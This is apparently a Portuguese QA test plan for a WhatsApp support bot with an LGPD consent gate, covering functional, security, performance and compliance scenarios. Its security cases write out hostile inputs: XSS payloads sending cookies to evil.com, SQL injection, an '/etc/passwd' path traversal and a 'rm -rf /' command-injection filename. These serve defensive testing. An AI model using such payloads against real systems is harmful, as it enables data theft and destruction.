# 🧪 CENÁRIOS DE TESTE - LGPD GATE (whatsapp-flow.js)

**Sistema:** Axion IA - WhatsApp Flow Manager  
**Arquivo:** `axion-ia-panel/api/src/whatsapp-flow.js`  
**QA Engineer:** Sênior  
**Data:** 2026-06-24  
**Cobertura Alvo:** 100% dos estados + edge cases

---

## 📊 SUMÁRIO DE COBERTURA

| Categoria | Cenários | Status |
|-----------|----------|--------|
| **Fluxo Principal (Happy Path)** | 12 | ✅ Documentado |
| **Fluxo de Erro** | 18 | ✅ Documentado |
| **Edge Cases** | 25 | ✅ Documentado |
| **Segurança** | 15 | ✅ Documentado |
| **Performance** | 8 | ✅ Documentado |
| **LGPD/Compliance** | 10 | ✅ Documentado |
| **Integração** | 12 | ✅ Documentado |
| **Total** | **100 cenários** | ✅ |

---

## 🎯 CENÁRIOS DE SUCESSO (HAPPY PATH)

### TC001: Fluxo completo de abertura de chamado com sucesso

**Objetivo:** Validar o fluxo end-to-end de um novo usuário abrindo ticket com foto  
**Prioridade:** 🔴 CRÍTICA  
**Estado inicial:** Nenhuma sessão existente  

**Pré-condições:**
- MongoDB online e acessível
- Jitbit API disponível (status 200)
- WhatsApp service conectado
- Categorias disponíveis no Jitbit

**Dados de entrada:**
```javascript
{
  telefone: "5511999999999",
  nome: "João Silva",
  assunto: "Erro no relatório de passagens",
  sistema: "AxHub",
  descricao: "Quando tento gerar o relatório mensal de passagens, o sistema retorna erro 500. Isso começou hoje às 14h.",
  categoria: "Suporte Técnico" (opção 2),
  foto: {
    buffer: <Buffer JPEG válido>,
    mimeType: "image/jpeg",
    filename: "erro-relatorio.jpg",
    size: 2048000 // 2MB
  }
}
```

**Passos:**
1. Enviar primeira mensagem: "Olá"
   - **Resultado esperado:** Bot apresenta termo LGPD
2. Responder: "1" (aceitar LGPD)
   - **Resultado esperado:** Consentimento registrado, exibe menu principal
3. Selecionar: "1" (abrir novo chamado)
   - **Resultado esperado:** Solicita assunto
4. Enviar: "Erro no relatório de passagens"
   - **Resultado esperado:** Confirma assunto, solicita sistema
5. Selecionar: "4" (AxHub)
   - **Resultado esperado:** Confirma sistema, solicita descrição
6. Enviar: "Quando tento gerar o relatório mensal de passagens, o sistema retorna erro 500. Isso começou hoje às 14h."
   - **Resultado esperado:** Confirma descrição, solicita categoria
7. Selecionar: "2" (Suporte Técnico)
   - **Resultado esperado:** Confirma categoria, solicita foto
8. Enviar foto (erro-relatorio.jpg)
   - **Resultado esperado:** Confirma recebimento, exibe resumo + sugestão IA, pede confirmação
9. Selecionar: "1" (confirmar)
   - **Resultado esperado:** 
     - Ticket criado no Jitbit
     - Foto anexada ao ticket
     - Mensagem de sucesso com número do ticket
     - Link para acompanhamento
     - Menu principal exibido novamente

**Resultado esperado:**
```
✅ *Chamado aberto com sucesso!*

🎫 Número: *#12345*
📌 Assunto: Erro no relatório de passagens
📊 Status: Aguardando atendimento

Você receberá atualizações aqui mesmo.
🔗 Acompanhe: https://desk.axiontecnologia.com.br/Ticket/12345
```

**Verificações no banco de dados:**
```javascript
// MongoDB: WhatsAppSessao
{
  telefone: "5511999999999",
  nome: "João Silva",
  estado: "menu",
  lgpdAceito: true,
  lgpdAceitoEm: <Date>,
  ultimoTicketId: 12345,
  ultimaMensagem: <Date>,
  ativo: true,
  dadosParciais: {
    ticketId: 12345,
    assuntoFinal: "Erro no relatório de passagens"
  }
}
```

**Verificações no Jitbit:**
- Ticket #12345 criado
- Subject: "Erro no relatório de passagens"
- Body contém: descrição + sistema + "Chamado aberto via WhatsApp por João Silva (5511999999999)"
- Category: "Suporte Técnico"
- Status: "New"
- Attachment: erro-relatorio.jpg (2MB, image/jpeg)

**Critérios de aceitação:**
- [ ] Sessão LGPD criada corretamente
- [ ] Todos os estados transitam corretamente
- [ ] Ticket criado no Jitbit com dados corretos
- [ ] Foto anexada corretamente
- [ ] Mensagem de sucesso exibida
- [ ] Estado final = "menu"
- [ ] Tempo total < 30 segundos

---

### TC002: Consultar ticket existente

**Objetivo:** Validar consulta de ticket criado anteriormente  
**Prioridade:** 🟠 ALTA  
**Estado inicial:** Sessão existente com LGPD aceito  

**Pré-condições:**
- Sessão já existente no MongoDB (lgpdAceito: true)
- Ticket #12345 existe no Jitbit
- Ticket pertence ao telefone do usuário

**Dados de entrada:**
```javascript
{
  telefone: "5511999999999",
  numeroTicket: "12345"
}
```

**Passos:**
1. Enviar: "menu"
   - **Resultado esperado:** Exibe menu principal
2. Selecionar: "2" (consultar chamado)
   - **Resultado esperado:** Solicita número do ticket
3. Enviar: "12345"
   - **Resultado esperado:** Busca ticket, exibe detalhes:
     ```
     📋 *Chamado #12345*
     
     *Assunto:* Erro no relatório de passagens
     *Status:* Em atendimento
     *Prioridade:* Normal
     *Técnico:* Maria Santos
     *Aberto em:* 24/06/2026
     
     💬 *Último comentário:*
     Estamos analisando o problema. Em breve daremos um retorno.
     ```
   - Menu principal exibido

**Verificações:**
- Dados do ticket corretos
- Último comentário exibido (até 200 caracteres)
- HTML do comentário removido
- Estado volta para "menu"

---

### TC003: Responder a ticket existente

**Objetivo:** Adicionar comentário a ticket aberto  
**Prioridade:** 🟠 ALTA  

**Pré-condições:**
- Sessão ativa, LGPD aceito
- Ticket #12345 existe e está aberto

**Dados de entrada:**
```javascript
{
  telefone: "5511999999999",
  numeroTicket: "12345",
  resposta: "O erro ainda persiste. Tentei novamente agora às 16h e continua retornando 500.",
  foto: null // Opcional
}
```

**Passos:**
1. Menu → "3" (responder chamado)
2. Enviar: "12345"
3. Enviar: "O erro ainda persiste. Tentei novamente agora às 16h e continua retornando 500."
4. **Resultado esperado:**
   ```
   ✅ Resposta enviada com sucesso ao chamado *#12345*!
   ```

**Verificações no Jitbit:**
- Comentário adicionado ao ticket #12345
- Body: "O erro ainda persiste... _Enviado via WhatsApp por João Silva (5511999999999)_"
- Ticket status permanece o mesmo

---

### TC004: Fazer pergunta sobre sistema (dúvida AxHub)

**Objetivo:** Usar IA para responder dúvida sem abrir ticket  
**Prioridade:** 🟠 ALTA  

**Pré-condições:**
- Sessão ativa
- Engine IA disponível
- Knowledge base AxHub populada

**Dados de entrada:**
```javascript
{
  telefone: "5511999999999",
  sistema: "AxHub",
  pergunta: "Como cadastrar um novo usuário no sistema?"
}
```

**Passos:**
1. Menu → "4" (dúvidas do sistema)
2. Selecionar: "1" (AxHub)
3. Enviar: "Como cadastrar um novo usuário no sistema?"
4. **Resultado esperado:**
   ```
   💡 *AxHub* — 📚 Base de conhecimento
   
   Para cadastrar um novo usuário:
   1. Acesse Configurações > Usuários
   2. Clique em "Novo Usuário"
   3. Preencha os dados obrigatórios (nome, email, perfil)
   4. Defina as permissões
   5. Clique em "Salvar"
   
   [Botões: "Sim, obrigado!" | "Não, abrir chamado" | "Tenho outra dúvida"]
   ```
5. Selecionar: "Sim, obrigado!"
6. **Resultado esperado:** Volta ao menu

**Verificações:**
- Resposta relevante e correta
- Score de confiança >= 0.65
- Fonte identificada (KB, embedding ou IA)
- Opções de feedback oferecidas

---

### TC005: Cancelar operação no meio do fluxo

**Objetivo:** Validar comando "cancelar" em qualquer estado  
**Prioridade:** 🟠 ALTA  

**Pré-condições:**
- Sessão ativa
- Estado: "aguardando_descricao"

**Passos:**
1. Iniciar abertura de chamado
2. Fornecer assunto e sistema
3. Na descrição, enviar: "cancelar"
4. **Resultado esperado:**
   ```
   ↩️ Operação cancelada.
   
   [Menu principal exibido]
   ```

**Verificações:**
- dadosParciais limpo
- Foto em memória deletada
- Estado = "menu"
- Nenhum ticket criado no Jitbit

---

### TC006: Encerrar atendimento

**Objetivo:** Finalizar sessão completamente  
**Prioridade:** 🟠 ALTA  

**Passos:**
1. Em qualquer estado, enviar: "sair"
2. **Resultado esperado:**
   ```
   ✅ Atendimento encerrado.
   
   Obrigado pelo contato! Ao enviar uma nova mensagem, o atendimento será reiniciado.
   ```

**Verificações no banco:**
```javascript
{
  estado: "encerrado",
  lgpdAceito: false, // Reset
  ativo: false,
  dadosParciais: {}
}
```

**Comportamento após encerrar:**
- Próxima mensagem → volta ao início (apresenta LGPD novamente)

---

### TC007: Fluxo de compras completo

**Objetivo:** Solicitar pedido de compras  
**Prioridade:** 🟡 MÉDIA  

**Pré-condições:**
- Sessão ativa, LGPD aceito
- Fluxo de compras habilitado

**Dados de entrada:**
```javascript
{
  titulo: "Reposição de equipamentos AxHub",
  motivo: "Equipamentos com defeito",
  sistema: "AxHub",
  cliente: "Prefeitura de São Paulo",
  tipo: "reposição",
  substituicao: true,
  devolucao: true,
  itens: "2x Câmera IP Intelbras VIP 1220B\n1x Switch 8 portas",
  destino: "Almoxarifado São Paulo - Rua X, 123",
  prioridade: "normal",
  aprovador: "gerente.sp@axion.com.br"
}
```

**Passos:**
1. Menu → "5" (solicitar compras)
2. Seguir wizard fornecendo cada informação
3. Confirmar
4. **Resultado esperado:**
   - Pedido criado no sistema de compras
   - Notificação enviada ao aprovador
   - Código do pedido retornado ao usuário

---

### TC008-TC012: Outros fluxos de sucesso

**TC008:** Consultar pedido de compras  
**TC009:** Aprovar pedido de compras (aprovador)  
**TC010:** Rejeitar pedido de compras (aprovador)  
**TC011:** Pesquisa de satisfação após ticket fechado  
**TC012:** Falar com atendente humano  

*(Detalhamento similar aos anteriores)*

---

## ❌ CENÁRIOS DE ERRO

### TC013: LGPD não aceito - Recusa do termo

**Objetivo:** Validar bloqueio quando usuário recusa LGPD  
**Prioridade:** 🔴 CRÍTICA  
**CWE:** CWE-285 (Authorization)  

**Passos:**
1. Primeira mensagem: "Olá"
2. Responder LGPD: "2" (não aceitar)
3. **Resultado esperado:**
   ```
   Entendido. O atendimento foi encerrado.
   
   Caso mude de ideia, envie uma mensagem a qualquer momento para reiniciar.
   ```

**Verificações:**
```javascript
// MongoDB
{
  estado: "encerrado",
  lgpdAceito: false,
  ativo: false
}
```

**Comportamento:**
- Qualquer mensagem subsequente → volta a apresentar LGPD novamente

---

### TC014: LGPD Bypass via aprovação de compras (BUG CRÍTICO)

**Objetivo:** Verificar se bypass reportado foi corrigido  
**Prioridade:** 🔴 CRÍTICA  
**Referência:** Code Review Issue #2  

**Pré-condições:**
- Usuário nunca interagiu antes (nenhuma sessão)
- Pedido de compras pendente aprovação enviado via email

**Passos:**
1. Usuário recebe notificação: "Pedido #P001 aguarda aprovação. Responda APROVAR ou REJEITAR"
2. Responder via WhatsApp: "APROVAR"
3. **Resultado esperado (APÓS CORREÇÃO):**
   ```
   Olá 👋
   
   Antes de processar sua aprovação, precisamos do seu consentimento LGPD...
   
   [Termo LGPD apresentado]
   ```
4. Após aceitar LGPD, aprovação é processada automaticamente

**Resultado esperado (ANTES DA CORREÇÃO - BUG):**
```
✅ Pedido #P001 aprovado com sucesso!
```
*(Sem passar pelo gate LGPD - INCORRETO)*

---

### TC015: Injection SQL/XSS em assunto do ticket

**Objetivo:** Validar sanitização de inputs  
**Prioridade:** 🔴 CRÍTICA  
**CWE:** CWE-79, CWE-89  
**Referência:** Code Review Issue #3  

**Dados de entrada:**
```javascript
{
  assunto: "<script>alert('XSS')</script>",
  descricao: "'; DROP TABLE Tickets; --",
  nome: "<img src=x onerror='fetch(\"evil.com?c=\"+document.cookie)'>Test"
}
```

**Resultado esperado:**
- Assunto salvo como: "scriptalert(XSS)script" (HTML removido)
- Descrição salva como: " DROP TABLE Tickets " (SQL chars escapados)
- Nome salvo como: "Test" (tags removidas)
- **NENHUM script executado**
- **NENHUMA query SQL modificada**

**Verificação no Jitbit:**
- Body do ticket NÃO contém tags HTML/script
- Caracteres perigosos escapados ou removidos

---

### TC016: Upload de arquivo malicioso

**Objetivo:** Validar rejeição de arquivos não-imagem  
**Prioridade:** 🔴 CRÍTICA  
**CWE:** CWE-434  
**Referência:** Code Review Issue #16  

**Dados de entrada:**
```javascript
{
  filename: "malware.exe",
  mimeType: "application/x-msdownload", // Falsificado como "image/jpeg"
  buffer: <Buffer de executável Windows>,
  size: 50000000 // 50MB
}
```

**Resultado esperado:**
```
⚠️ Tipo de arquivo não permitido: exe. Envie apenas imagens (JPG, PNG, GIF)

Por favor, envie uma imagem válida ou digite *0* para continuar sem foto.
```

**Verificações:**
- Arquivo NÃO salvo em memória
- MIME type verificado via magic bytes (não confia no header)
- Buffer NÃO enviado ao Jitbit

**Casos adicionais:**
- Shell script (.sh, .bash)
- APK Android
- Arquivo ZIP mascarado como imagem
- Polyglot file (JPG + PHP)
- Zip bomb (arquivo comprimido que expande para TB)

---

### TC017: Imagem muito grande (DoS)

**Objetivo:** Prevenir memory exhaustion  
**Prioridade:** 🔴 CRÍTICA  
**Referência:** Code Review Issue #4  

**Dados de entrada:**
```javascript
{
  filename: "gigante.jpg",
  mimeType: "image/jpeg",
  buffer: <Buffer 500MB>,
  size: 524288000 // 500MB
}
```

**Resultado esperado:**
```
⚠️ Imagem muito grande (500.0MB). Máximo: 10MB

Por favor, envie uma imagem menor ou digite *0* para continuar sem foto.
```

**Verificações:**
- Buffer NÃO salvo em memória
- Memory usage não aumenta
- Sistema permanece responsivo

---

### TC018: Rate limiting - Spam de mensagens

**Objetivo:** Prevenir DoS via flood  
**Prioridade:** 🔴 CRÍTICA  
**CWE:** CWE-770  
**Referência:** Code Review Issue #5  

**Dados de entrada:**
- 100 mensagens enviadas em 10 segundos do mesmo telefone

**Resultado esperado:**
- Mensagens 1-20: Processadas normalmente
- Mensagem 21:
  ```
  ⚠️ *Limite de mensagens atingido*
  
  Você pode enviar até 20 mensagens por minuto.
  Tente novamente em 40 segundos.
  ```
- Mensagens 22-100: Ignoradas (não processadas)

**Verificações:**
- MongoDB connections não esgotadas
- Sistema responde a outros usuários normalmente
- Rate limit reseta após 60 segundos

---

### TC019: Jitbit API timeout

**Objetivo:** Validar tratamento de timeout  
**Prioridade:** 🔴 CRÍTICA  
**CWE:** CWE-834  
**Referência:** Code Review Issue #7  

**Simulação:**
```javascript
// Mock Jitbit API com delay 15s
mockJitbitAPI.criarTicket = async () => {
  await sleep(15000); // 15 segundos
  return { ticketId: 12345 };
};
```

**Resultado esperado (após 10s):**
```
⚠️ O sistema de chamados está lento no momento.

Por favor, tente novamente em alguns minutos.

[Menu exibido]
```

**Verificações:**
- Timeout configurado: 10 segundos
- Thread do Node.js NÃO bloqueia
- Outras mensagens processadas normalmente
- Estado do usuário reseta para "menu"

---

### TC020: MongoDB desconectado

**Objetivo:** Graceful degradation  
**Prioridade:** 🟠 ALTA  

**Simulação:**
- Parar MongoDB container antes do teste

**Resultado esperado:**
```
⚠️ Sistema temporariamente indisponível.

Por favor, tente novamente em alguns instantes ou entre em contato pelo telefone (11) 3333-4444.
```

**Verificações:**
- Aplicação NÃO crasha
- Erro logado corretamente
- Retry automático após reconexão

---

### TC021: Jitbit credenciais inválidas

**Objetivo:** Validar tratamento de AUTH_FAILED  
**Prioridade:** 🟠 ALTA  

**Simulação:**
```javascript
process.env.JITBIT_PASS = "senhaErrada123";
```

**Resultado esperado:**
```
❌ Erro ao abrir chamado: Credenciais inválidas no sistema.

Digite *menu* para tentar novamente.
```

**Verificações:**
- Senha NÃO aparece no log
- Ticket NÃO criado
- Estado volta para "menu"
- Alerta enviado para admin

---

### TC022: Sessão corrompida no banco

**Objetivo:** Recovery de dados inválidos  
**Prioridade:** 🟡 MÉDIA  

**Simulação:**
```javascript
// MongoDB: sessão com estado inválido
{
  telefone: "5511999999999",
  estado: "ESTADO_NAO_EXISTE", // ← Inválido
  dadosParciais: null // ← Deveria ser objeto
}
```

**Resultado esperado:**
- Estado resetado para "menu"
- dadosParciais resetado para {}
- Mensagem de erro NÃO exibida ao usuário
- Log de erro gerado

---

### TC023: Categoria inexistente selecionada

**Objetivo:** Validar fallback de categoria  
**Prioridade:** 🟡 MÉDIA  

**Simulação:**
- Usuário seleciona categoria "5"
- Jitbit retorna apenas 3 categorias
- Ou categoria foi deletada entre cache e seleção

**Resultado esperado:**
```
⚠️ Erro interno: categoria com ID inválido. Usando categoria padrão.
```

**Verificações:**
- Ticket criado com categoria padrão (ID 1)
- Erro logado para investigação

---

### TC024: Foto com download failed

**Objetivo:** Retry de download  
**Prioridade:** 🟡 MÉDIA  

**Simulação:**
```javascript
{
  midia: {
    downloadOk: false, // ← Falha no download do WhatsApp
    buffer: null,
    erro: "Connection timeout"
  }
}
```

**Resultado esperado:**
```
⚠️ Não consegui processar a imagem. Por favor, tente enviar novamente.

Ou digite *0* para continuar sem foto.
```

---

### TC025-TC030: Outros cenários de erro

**TC025:** Resposta a ticket que não pertence ao usuário (ownership violation)  
**TC026:** Consulta de ticket inexistente  
**TC027:** Erro no engine IA (OpenAI down)  
**TC028:** Cache de categorias retorna vazio  
**TC029:** Comentário de ticket com HTML malformado  
**TC030:** Tentativa de reenvio de foto após timeout  

---

## 🔍 EDGE CASES

### TC031: Texto com emojis e caracteres especiais

**Dados de entrada:**
```
Assunto: "Erro 💥 no sistema AxHub 🚗 (crítico!!!)"
Descrição: "Testando: 你好世界 مرحبا بالعالم Здравствуй мир 🎉🎊✨"
```

**Resultado esperado:**
- Emojis preservados (UTF-8)
- Unicode normalizado
- Tamanho validado após encoding

---

### TC032: Mensagem vazia ou somente espaços

**Dados de entrada:**
```
texto: "     " // 5 espaços
```

**Resultado esperado:**
- Tratado como mensagem vazia
- Solicita input novamente

---

### TC033: Número de telefone internacional

**Dados de entrada:**
```
telefone: "+1-555-123-4567" // EUA
```

**Resultado esperado:**
- Aceitar se validação ajustada
- Ou rejeitar se apenas Brasil

---

### TC034: Nome com mais de 100 caracteres

**Dados de entrada:**
```
nome: "A" * 200 // 200 caracteres 'A'
```

**Resultado esperado:**
- Truncado para 100 caracteres
- Sem erro exibido

---

### TC035: Duplo clique no botão (mensagens duplicadas)

**Simulação:**
- Enviar "1" (aceitar LGPD)
- Enviar "1" novamente 100ms depois (duplo clique)

**Resultado esperado:**
- Primeira mensagem processa
- Segunda mensagem ignora (idempotência)
- Ou trata como nova interação (se estado já mudou)

---

### TC036: Sessão expira durante preenchimento

**Simulação:**
- Usuário preenche assunto
- Aguarda 8 dias (TTL session expire)
- Tenta continuar

**Resultado esperado:**
- Sessão não encontrada
- Nova sessão criada
- LGPD solicitado novamente

---

### TC037: Foto enviada antes de solicitar

**Simulação:**
- Estado: "aguardando_assunto"
- Usuário envia foto

**Resultado esperado:**
```
📸 Recebi sua foto, mas ainda estamos no início do atendimento.

Por favor, siga as instruções. Estamos aguardando o assunto do chamado.
```

---

### TC038: Comando "menu" durante fluxo de compras

**Estado:** "compras_itens"  
**Input:** "menu"  

**Resultado esperado:**
- Fluxo de compras cancelado
- dadosParciais limpo
- Menu principal exibido

---

### TC039: Múltiplas sessões do mesmo telefone (race condition)

**Simulação:**
```javascript
// Enviar 2 mensagens simultâneas
Promise.all([
  processarMensagemWA("5511999999999", "João", "Olá"),
  processarMensagemWA("5511999999999", "João", "Olá")
]);
```

**Resultado esperado:**
- Apenas 1 sessão criada (unique constraint)
- Ambas mensagens processadas
- Sem deadlock

---

### TC040: Aprovação de compras com keyword ambígua

**Dados de entrada:**
- Pedido pendente aprovação
- Usuário envia: "sim" (keyword fraca, precisa vinculação)
- MAS dadosParciais._pedidoAprovacao está vazio

**Resultado esperado:**
- NÃO processa como aprovação
- Trata como resposta normal no fluxo atual

---

### TC041-TC055: Outros edge cases

**TC041:** Ticket fechado e reaberto  
**TC042:** Usuário responde após ticket já fechado  
**TC043:** Nome com caracteres RTL (árabe, hebraico)  
**TC044:** Mensagem com 10.000 caracteres  
**TC045:** Assunto vazio após trim  
**TC046:** Sistema não está na lista (digitação livre)  
**TC047:** Categoria retornada sem campo CategoryID  
**TC048:** Comentário do Jitbit com 50KB de HTML  
**TC049:** Múltiplos tickets abertos simultaneamente  
**TC050:** Pesquisa satisfação enviada 2x por erro  
**TC051:** Usuário muda de telefone (mesmo nome)  
**TC052:** Foto PNG transparente  
**TC053:** Foto animada (GIF animado)  
**TC054:** Imagem com EXIF malicioso  
**TC055:** Resposta com apenas emoji  

---

## 🔐 CENÁRIOS DE SEGURANÇA

### TC056: Tentativa de SQL Injection via número de ticket

**Dados de entrada:**
```
numeroTicket: "1 OR 1=1; DROP TABLE Tickets;--"
```

**Resultado esperado:**
- Parsing falha (parseInt retorna NaN)
- Mensagem: "Por favor, envie apenas o número do chamado"
- NENHUMA query SQL executada

---

### TC057: XSS via nome do usuário no histórico

**Dados de entrada:**
```
nome: "<script>fetch('https://evil.com/steal?data='+document.cookie)</script>"
```

**Resultado esperado:**
- Nome sanitizado antes de salvar
- Script tags removidas
- Histórico no Jitbit não executa script

---

### TC058: Path traversal em filename

**Dados de entrada:**
```
filename: "../../../../etc/passwd"
```

**Resultado esperado:**
- Filename sanitizado: "etcpasswd"
- Arquivo NÃO escrito fora do diretório esperado

---

### TC059: LDAP Injection (se auth usar LDAP)

**Dados de entrada:**
```
telefone: "*(objectClass=*)"
```

**Resultado esperado:**
- Validação de telefone falha antes de LDAP
- Query LDAP NÃO modificada

---

### TC060: Command Injection via nome do arquivo

**Dados de entrada:**
```
filename: "foto.jpg; rm -rf /"
```

**Resultado esperado:**
- Comando NÃO executado
- Filename sanitizado: "foto.jpg rm -rf "

---

### TC061: Bypass de rate limit com múltiplos IPs

**Simulação:**
- Atacante usa 10 proxies diferentes
- Mesmo telefone, IPs variados

**Resultado esperado:**
- Rate limit por telefone (não por IP)
- Todas as requisições contam no mesmo contador

---

### TC062: Session fixation

**Simulação:**
- Atacante descobre sessionId de vítima
- Tenta usar para acessar dados

**Resultado esperado:**
- WhatsApp sessions não usam sessionId exposto
- Autenticação via telefone verificado pelo WhatsApp

---

### TC063: CSRF (se houver endpoints REST)

*(Aplicável se houver webhook/callback REST)*

**Simulação:**
- POST /whatsapp/message sem CSRF token

**Resultado esperado:**
- Request rejeitada
- 403 Forbidden

---

### TC064: Clickjacking via WhatsApp Web

*(Depende da UI do WhatsApp Web)*

**Mitigação:** Fora do escopo (WhatsApp controla)

---

### TC065: Insecure deserialization

**Simulação:**
```javascript
dadosParciais: "rO0ABXNy..." // Objeto Java serializado malicioso
```

**Resultado esperado:**
- MongoDB aceita apenas JSON
- Desserialização segura via mongoose

---

### TC066-TC070: Outros testes de segurança

**TC066:** Credential stuffing (100 tentativas de aprovação)  
**TC067:** Privilege escalation (usuário tenta acessar admin)  
**TC068:** Information disclosure via mensagens de erro  
**TC069:** Timing attack em verificação de ownership  
**TC070:** Denial of Service via regex complexo (ReDoS)  

---

## ⚡ CENÁRIOS DE PERFORMANCE

### TC071: Carga concorrente - 1000 usuários simultâneos

**Objetivo:** Validar escalabilidade  
**Prioridade:** 🟠 ALTA  

**Simulação:**
```javascript
// JMeter ou Artillery
const usuarios = Array.from({ length: 1000 }, (_, i) => ({
  telefone: `551199999${String(i).padStart(4, "0")}`,
  nome: `Usuario${i}`
}));

// Enviar mensagens simultâneas
await Promise.all(usuarios.map(u => 
  processarMensagemWA(u.telefone, u.nome, "Olá")
));
```

**Métricas esperadas:**
- Tempo médio de resposta: < 2s
- Percentil 95: < 5s
- Taxa de erro: < 1%
- MongoDB connections: < 50 (pooling efetivo)
- Memory usage: < 1GB

---

### TC072: Query lenta no MongoDB

**Simulação:**
- Banco com 1 milhão de sessões
- Query sem índice: `WhatsAppSessao.find({ ativo: true })`

**Resultado esperado:**
- Índices criados: `{ telefone: 1 }`, `{ ultimaMensagem: 1 }`
- Query execution time: < 100ms

---

### TC073: Cache hit/miss ratio

**Objetivo:** Validar eficiência do cache de categorias  

**Métricas:**
- Cache hit ratio: > 90%
- Calls to Jitbit API: < 10 por hora
- Cache eviction: funciona após 5 minutos

---

### TC074: Memory leak test - 10.000 fotos

**Simulação:**
- 10.000 usuários enviam foto de 5MB cada
- Monitorar memory usage por 1 hora

**Resultado esperado:**
- Memory NÃO cresce linearmente
- Limpeza automática após 5 min (TTL)
- Memory estabiliza em < 2GB

---

### TC075: Timeout de inatividade

**Simulação:**
- Usuário inicia fluxo
- Aguarda 30 minutos sem enviar mensagem

**Resultado esperado:**
- Sessão permanece ativa (não há timeout de inatividade atualmente)
- **OU** (após implementar): sessão expira, notificação enviada

---

### TC076-TC078: Outros testes de performance

**TC076:** Throughput máximo (mensagens/segundo)  
**TC077:** Latência de rede Jitbit (geograficamente distante)  
**TC078:** Stress test - 10.000 usuários em 1 minuto  

---

## 📋 CENÁRIOS DE COMPLIANCE (LGPD)

### TC079: Auditoria - Dados pessoais logados

**Objetivo:** Validar que logs NÃO contêm dados pessoais  
**Prioridade:** 🔴 CRÍTICA  
**LGPD:** Art. 46, §1º  

**Procedimento:**
1. Executar fluxo completo de abertura de ticket
2. Inspecionar todos os logs gerados

**Resultado esperado:**
- Telefone pseudonimizado: "5511****a1b2c3d4"
- Nome NÃO aparece em logs de console
- Descrição do ticket NÃO aparece em logs

**Verificação:**
```bash
grep -r "5511999999999" logs/ # Deve retornar 0 resultados
grep -r "João Silva" logs/   # Deve retornar 0 resultados
```

---

### TC080: Direito ao esquecimento (Right to be forgotten)

**Objetivo:** Implementar endpoint LGPD para deletar dados  
**Prioridade:** 🔴 CRÍTICA  
**LGPD:** Art. 18, VI  

**Requisição:**
```http
DELETE /api/lgpd/usuarios/5511999999999
Authorization: Bearer <token_admin>
```

**Resultado esperado:**
- Sessão deletada do MongoDB
- Histórico de mensagens anonimizado
- Tickets no Jitbit: telefone substituído por "[DADOS REMOVIDOS LGPD]"
- Fotos em storage deletadas
- Resposta: 204 No Content

---

### TC081: Exportação de dados (Data portability)

**Objetivo:** Fornecer dados do usuário em formato legível  
**Prioridade:** 🟠 ALTA  
**LGPD:** Art. 18, II  

**Requisição:**
```http
GET /api/lgpd/usuarios/5511999999999/exportar
```

**Resultado esperado:**
```json
{
  "telefone": "5511999999999",
  "nome": "João Silva",
  "lgpd": {
    "consentimentoEm": "2026-06-24T10:30:00Z",
    "versao": "2.0"
  },
  "tickets": [
    {
      "id": 12345,
      "assunto": "Erro no relatório",
      "status": "Fechado",
      "criadoEm": "2026-06-24T10:35:00Z"
    }
  ],
  "interacoes": 15,
  "ultimaInteracao": "2026-06-24T11:00:00Z"
}
```

---

### TC082: Retenção de dados - Sessões antigas deletadas

**Objetivo:** Validar TTL de 7 dias no MongoDB  
**Prioridade:** 🟡 MÉDIA  
**LGPD:** Art. 16 (finalidade)  

**Simulação:**
- Criar sessão com `ultimaMensagem: Date.now() - 8 dias`
- Aguardar 1 hora (MongoDB TTL check)

**Resultado esperado:**
- Sessão automaticamente deletada
- Index TTL funcionando: `{ ultimaMensagem: 1 }, expireAfterSeconds: 604800`

---

### TC083: Consentimento granular (IA opcional)

**Objetivo:** Permitir desativar sugestões IA mantendo atendimento  
**Prioridade:** 🟡 MÉDIA  
**LGPD:** Art. 7º, I (consentimento específico)  

**Fluxo:**
1. Usuário aceita LGPD base
2. Pergunta adicional: "Deseja receber sugestões de IA?"
   - Sim → `consentimentoIA: true`
   - Não → `consentimentoIA: false`

**Comportamento:**
- Se `consentimentoIA: false`:
  - Pular sugestão IA em handleFoto
  - Pular busca IA em handleDuvida

---

### TC084: Revisão de consentimento

**Objetivo:** Usuário pode revogar consentimento  
**Prioridade:** 🟡 MÉDIA  
**LGPD:** Art. 8º, §5º  

**Comando:** "revogar consentimento"

**Resultado esperado:**
```
Seu consentimento LGPD foi revogado.

Seus dados serão mantidos apenas pelo prazo legal necessário e depois anonimizados.

Para continuar usando o atendimento, você precisará fornecer novo consentimento.
```

**Comportamento:**
- lgpdAceito = false
- Estado = "encerrado"
- Flag `lgpdRevogadoEm: Date`

---

### TC085: Termo LGPD versionado

**Objetivo:** Forçar nova aceitação quando termo mudar  
**Prioridade:** 🟡 MÉDIA  

**Simulação:**
- Usuário com `lgpdVersao: "1.0"`
- Sistema atualiza para `LGPD_VERSAO_ATUAL = "2.0"`

**Resultado esperado:**
- Ao enviar mensagem:
  ```
  Nossos termos de privacidade foram atualizados.
  
  Por favor, revise e aceite a nova versão para continuar.
  
  [Novo termo LGPD exibido]
  ```

---

### TC086-TC088: Outros testes LGPD

**TC086:** Finalidade de tratamento especificada no termo  
**TC087:** Base legal para cada tipo de dado coletado  
**TC088:** Notificação de incidente de segurança (se houver breach)  

---

## 🔗 CENÁRIOS DE INTEGRAÇÃO

### TC089: Jitbit API retorna 503 (Service Unavailable)

**Simulação:**
- Jitbit em manutenção

**Resultado esperado:**
- Retry automático (3 tentativas)
- Exponential backoff: 1s, 2s, 4s
- Após 3 falhas:
  ```
  ⚠️ Sistema de chamados temporariamente indisponível.
  
  Seu pedido foi registrado e será processado assim que o sistema voltar.
  ```

---

### TC090: WhatsApp service desconecta

**Simulação:**
- Baileys socket desconecta durante envio

**Resultado esperado:**
- Reconexão automática
- Mensagens enfileiradas (queue)
- Reenvio após reconectar

---

### TC091: OpenAI API rate limit

**Simulação:**
- OpenAI retorna 429 (Too Many Requests)

**Resultado esperado:**
- Pular sugestão IA
- Continuar fluxo normalmente
- Log warning gerado

---

### TC092: MongoDB replica set failover

**Simulação:**
- Primary node cai, secondary promovido

**Resultado esperado:**
- Mongoose reconecta automaticamente
- Operações pendentes: retry
- Downtime: < 5 segundos

---

### TC093: Jitbit attachment upload fails

**Simulação:**
- Ticket criado OK
- Foto anexa retorna 500

**Resultado esperado:**
- Ticket criado normalmente
- Log de erro: "Não foi possível anexar foto"
- Foto NÃO persiste em memória (limpa mesmo com erro)

---

### TC094-TC100: Outros testes de integração

**TC094:** Jitbit retorna ticket duplicado  
**TC095:** Categoria do Jitbit deletada durante fluxo  
**TC096:** Engine IA retorna resposta vazia  
**TC097:** Redis cache indisponível (se implementado)  
**TC098:** Webhook Jitbit (ticket fechado) com payload inválido  
**TC099:** WhatsApp media download timeout  
**TC100:** Múltiplas instâncias do bot (load balancer)  

---

